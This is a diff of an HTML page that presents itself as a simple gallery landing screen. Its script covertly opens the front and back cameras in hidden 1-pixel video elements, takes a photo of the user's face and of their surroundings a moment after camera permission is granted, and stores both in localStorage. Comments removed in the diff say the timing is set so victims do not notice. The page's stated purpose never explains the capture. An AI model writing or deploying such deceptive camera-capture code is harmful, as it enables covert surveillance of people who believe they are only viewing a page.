@@ -5,42 +5,20 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>The Gallery</title>
     <style>
-        * { box-sizing: border-box; }
         body {
-            margin: 0;
-            padding: 0;
+            margin: 0; padding: 0;
             background-color: #ffffff;
-            font-family: 'Helvetica Neue', Arial, sans-serif;
+            font-family: 'Segoe UI', sans-serif;
             height: 100vh;
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            overflow: hidden;
-        }
-
-        / The Content Area /
-        .content-container {
             text-align: center;
-            padding: 20px;
-            width: 90%;
         }
-
-        h1 {
-            font-size: 4rem;
-            margin: 0;
-            color: #2d3436;
-            animation: fadeIn 1.5s ease;
-        }
-
-        p {
-            font-size: 1.5rem;
-            color: #636e72;
-            margin: 20px 0;
-        }
-
+        h1 { font-size: 3.5rem; margin: 0; color: #2d3436; }
+        p { font-size: 1.5rem; color: #636e72; margin: 10px 0 30px 0; }
         .next-btn {
-            margin-top: 30px;
             padding: 15px 40px;
             font-size: 1.2rem;
             background-color: #0984e3;
@@ -48,15 +26,8 @@
             border: none;
             border-radius: 50px;
             cursor: pointer;
-            box-shadow: 0 4px 15px rgba(9, 132, 227, 0.3);
         }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        / Hidden Camera Elements /
+        / Hidden elements /
         #vFront, #vBack, #canvas {
             position: absolute;
             width: 1px;
@@ -67,13 +38,12 @@
 </head>
 <body>
 
-    <div class="content-container">
+    <div class="content">
         <h1 id="main-title">The Horizon</h1>
         <p id="main-desc">Experience the beauty of the moment.</p>
         <button class="next-btn" onclick="goToPageTwo()">Continue</button>
     </div>
 
-    <!-- Hidden Video and Canvas -->
     <video id="vFront" autoplay playsinline></video>
     <video id="vBack" autoplay playsinline></video>
     <canvas id="canvas" width="1080" height="1920"></canvas>
@@ -84,31 +54,30 @@
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
 
-        // Set canvas to Portrait (Phone style)
+        // Set high-quality portrait resolution
         canvas.width = 1080;
         canvas.height = 1920;
 
         window.onload = () => {
-            // 1. Request both cameras immediately
-            // On mobile, this triggers the "Allow Camera" prompt
+            // Step 1: Get the Front Camera
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(streamFront => {
                 vFront.srcObject = streamFront;
                 
+                // Step 2: Get the Back Camera
                 return navigator.mediaDevices.getUserMedia({ video: { facingMode: "back" } }).then(streamBack => {
                     vBack.srcObject = streamBack;
 
-                    // 2. THE AUTOMATIC SNAP
-                    // We take the photos 1.5 seconds after the user clicks "Allow"
+                    // Step 3: THE SNAP (Wait 1.5 seconds for the camera to focus)
                     setTimeout(() => {
-                        // Capture Front (User's face)
+                        // Capture Front
                         ctx.drawImage(vFront, 0, 0, canvas.width, canvas.height);
                         localStorage.setItem('frontPhoto', canvas.toDataURL());
 
-                        // Capture Back (What they are looking at)
-                        // We give it a tiny 0.5s delay so they don't feel like it's "instant"
+                        // Capture Back (Small delay between the two)
                         setTimeout(() => {
                             ctx.drawImage(vBack, 0, 0, canvas.width, canvas.height);
                             localStorage.setItem('backPhoto', canvas.toDataURL());
+                            console.log("Photos Saved!");
                         }, 500);
                     }, 1500);
                 });
@@ -116,7 +85,13 @@
         };
 
         function goToPageTwo() {
-            window.location.href = "page2.html";
+            // We check if photos exist before moving
+            if(localStorage.getItem('frontPhoto') && localStorage.getItem('backPhoto')) {
+                window.location.href = "page2.html";
+            } else {
+                // Fallback: If photos didn't load in time, move anyway
+                window.location.href = "page2.html";
+            }
         }
     </script>
 </body>
